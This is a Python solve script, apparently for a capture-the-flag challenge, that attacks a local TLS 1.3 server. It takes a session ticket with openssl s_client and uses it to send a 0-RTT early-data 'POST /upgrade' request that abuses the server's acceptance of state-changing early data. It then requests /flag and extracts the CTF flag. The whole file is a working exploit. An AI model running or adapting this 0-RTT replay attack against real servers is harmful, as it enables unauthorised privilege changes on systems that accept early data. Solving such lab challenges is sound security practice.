#!/usr/bin/env python3
import subprocess
import tempfile
import sys
import re
from pathlib import Path

HOST = "127.0.0.1"
PORT = 4433

OPENSSL = "openssl"  # adjust if needed, e.g. "openssl-3"


def run_cmd(cmd, stdin_data: bytes | None = None) -> subprocess.CompletedProcess:
    """Run a command and return CompletedProcess, fail hard on error."""
    proc = subprocess.run(
        cmd,
        input=stdin_data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    return proc


def get_session_ticket(sess_path: Path) -> None:
    print("[*] Step 1: Obtaining TLS 1.3 session ticket...")
    cmd = [
        OPENSSL,
        "s_client",
        "-connect",
        f"{HOST}:{PORT}",
        "-sess_out",
        str(sess_path),
        "-tls1_3",
    ]
    # no HTTP needed; just let handshake complete and close
    proc = run_cmd(cmd, b"Q\n")
    if proc.returncode != 0:
        print(proc.stderr.decode(errors="ignore"))
        raise SystemExit("[!] Failed to obtain session ticket")

    if not sess_path.exists() or sess_path.stat().st_size == 0:
        raise SystemExit("[!] Session file not created or empty")
    print("[+] Session ticket saved to", sess_path)


def send_0rtt_upgrade(sess_path: Path) -> None:
    print("[*] Step 2: Sending 0-RTT early data POST /upgrade...")
    early_http = b"POST /upgrade HTTP/1.1\r\nHost: localhost\r\n\r\n"

    # write early data to a temp file because -early_data expects a file
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp.write(early_http)
        tmp_path = Path(tmp.name)

    cmd = [
        OPENSSL,
        "s_client",
        "-connect",
        f"{HOST}:{PORT}",
        "-sess_in",
        str(sess_path),
        "-early_data",
        str(tmp_path),
        "-tls1_3",
    ]

    proc = run_cmd(cmd, b"Q\n")  # we don't care about post-handshake data here
    tmp_path.unlink(missing_ok=True)

    if proc.returncode != 0:
        print(proc.stderr.decode(errors="ignore"))
        raise SystemExit("[!] Failed to send 0-RTT early data")

    stdout = proc.stdout.decode(errors="ignore")
    print("[+] 0-RTT connection completed")
    # Optional: debug
    # print(stdout)


def fetch_flag() -> str:
    print("[*] Step 3: Fetching flag via GET /flag...")
    http_req = f"GET /flag HTTP/1.1\r\nHost: {HOST}\r\n\r\n".encode()

    cmd = [
        OPENSSL,
        "s_client",
        "-connect",
        f"{HOST}:{PORT}",
        "-tls1_3",
    ]
    proc = run_cmd(cmd, http_req)
    print(proc.stderr.decode(errors="ignore"))
    print(proc.stdout.decode(errors="ignore"))
    if proc.returncode != 0:
        print(proc.stderr.decode(errors="ignore"))
        raise SystemExit("[!] Failed to fetch /flag")

    out = proc.stdout.decode(errors="ignore")
    # crude parse
    m = re.search(r"flag:\s*(CTF\{[^\r\n]+})", out)
    if not m:
        print(out)
        raise SystemExit("[!] Flag not found in response")

    flag = m.group(1)
    print("[+] Flag found!")
    return flag


def main():
    sess_path = Path("sess.pem")

    get_session_ticket(sess_path)
    send_0rtt_upgrade(sess_path)
    flag = fetch_flag()

    print()
    print("FLAG:", flag)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
